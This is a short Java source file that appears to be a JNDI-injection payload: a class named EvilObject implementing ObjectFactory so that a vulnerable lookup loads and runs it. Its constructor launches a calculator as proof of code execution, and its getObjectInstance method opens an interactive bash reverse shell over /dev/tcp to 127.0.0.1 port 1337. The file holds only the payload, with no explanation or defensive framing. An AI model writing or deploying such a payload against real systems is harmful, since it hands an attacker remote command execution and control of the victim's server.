import java.lang.Runtime;
import java.lang.Process;
import javax.naming.spi.ObjectFactory;
import javax.naming.*;
import java.util.Hashtable;


public class EvilObject implements ObjectFactory {

    public EvilObject() throws Exception {
        System.out.println("EvilObject contruct called");	
        Runtime.getRuntime().exec("gnome-calculator");
    }
    public Object getObjectInstance(Object obj, Name name,
                                    Context nameCtx,
                                    Hashtable<?, ?> environment) 
            throws Exception {

        System.out.println("getObjectInstance executed");
	Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/127.0.0.1/1337 0>&1"});
        return null;
    }
}
